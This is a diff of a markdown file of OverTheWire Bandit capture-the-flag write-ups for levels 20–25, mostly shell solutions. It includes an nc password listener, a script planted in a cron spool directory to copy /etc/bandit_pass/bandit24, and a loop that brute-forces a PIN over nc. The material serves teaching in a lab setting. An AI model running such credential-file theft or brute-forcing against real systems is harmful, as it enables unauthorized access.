@@ -1,10 +1,6 @@
-# Bandit CTF Writeups: Levels 13 to 19
+# Bandit CTF Writeups: Levels 20 to 25
 
-This document contains the objectives, terminal commands, and system-level logic for solving levels 0 through 6 of the OverTheWire Bandit wargame.
-
----
-
-**Host:** `bandit.labs.overthewire.org`
+**Host:** `bandit.labs.overthewire.org`  
 **Port:** `2220`
 
 ---
@@ -16,9 +12,8 @@ Use a setuid binary `suconnect` that connects to a port you specify, reads a pas
 
 ## Solution
 
-```
-echo "[REDACTED]" | nc -l -p 4444 &
-
+```bash
+echo "bandit20_password" | nc -l -p 4444 &
 ./suconnect 4444
 ```
 
@@ -27,49 +22,15 @@ echo "[REDACTED]" | nc -l -p 4444 &
 # Bandit Level 21 → 22
 
 ## Goal
-A cron job is running periodically as bandit22. Find what it does and use it to get the password.
+A cron job runs periodically as bandit22. Find what it does and use it to get the password.
 
 ## Solution
 
-```
-# 1. Check what cron jobs exist
+```bash
 ls -la /etc/cron.d/
-
-# 2. Read the bandit22 cron job
 cat /etc/cron.d/cronjob_bandit22
-# → runs /usr/bin/cronjob_bandit22.sh every minute as bandit22
-
-# 3. Read the script
 cat /usr/bin/cronjob_bandit22.sh
-# → copies bandit22's password to a world-readable /tmp file
-
-# 4. Read that file
-cat /tmp/[REDACTED]
-```
-
-## Concept
-Cron runs scripts on a schedule. The script runs as bandit22 and writes the password to a `/tmp` file with `chmod 644` (world-readable). You just need to find and read that file.
-
----
-
-# Bandit Level 22 → 23
-
-## Goal
-A cron job runs as bandit23 and writes the password to a `/tmp` file named after an md5 hash. Figure out the filename and read it.
-
-## Solution
-
-```bash
-
-cat /usr/bin/cronjob_bandit23.sh
-
-
-
-echo I am user bandit23 | md5sum | cut -d ' ' -f 1
-
-
-
-cat /tmp/[REDACTED]
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 ```
 
 ---
@@ -82,11 +43,56 @@ A cron job runs as bandit23 and writes the password to a `/tmp` file named after
 ## Solution
 
 ```bash
-
 cat /usr/bin/cronjob_bandit23.sh
-
 mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
 echo $mytarget
-
-cat /tmp/[REDACTED]
+cat /tmp/$mytarget
 ```
+
+---
+
+# Bandit Level 23 → 24
+
+## Goal
+A cron job runs as bandit24 and executes then deletes any script in `/var/spool/bandit24/foo` owned by bandit23. Write a script that copies the password out.
+
+## Solution
+
+```bash
+cat /usr/bin/cronjob_bandit24.sh
+
+mktemp -d
+chmod 777 /tmp/tmp.XXXXXX
+cd /tmp/tmp.XXXXXX
+
+nano test.sh
+```
+
+Contents of `test.sh`:
+```bash
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.XXXXXX/pwd24.txt
+```
+
+```bash
+chmod +x test.sh
+cp test.sh /var/spool/bandit24/foo
+cat /tmp/tmp.XXXXXX/pwd24.txt
+```
+
+---
+
+# Bandit Level 24 → 25
+
+## Goal
+A daemon on port 30002 requires the bandit24 password plus a secret 4-digit PIN (0000–9999). Brute-force all 10000 combinations to find the correct one.
+
+## Solution
+
+```bash
+for i in {0000..9999}; do
+    echo "bandit24_password $i"
+done | nc localhost 30002 | grep -vi "wrong"
+```
+
+---
